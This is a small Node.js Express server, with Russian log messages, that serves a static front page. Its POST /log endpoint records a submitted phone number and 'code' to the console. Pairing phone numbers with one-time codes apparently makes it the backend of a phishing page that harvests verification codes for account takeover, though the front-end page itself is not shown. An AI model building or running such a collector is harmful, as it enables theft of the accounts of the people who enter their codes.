const express = require("express");
const path = require("path");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());

app.post("/log", (req, res) => {
    const { phone, code, timestamp } = req.body;
    console.log("📱 Номер:", phone);
    console.log("🔢 Код:", code);
    console.log("🕒 Время:", timestamp || new Date().toISOString());
    console.log("---");
    res.json({ status: "ok" });
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
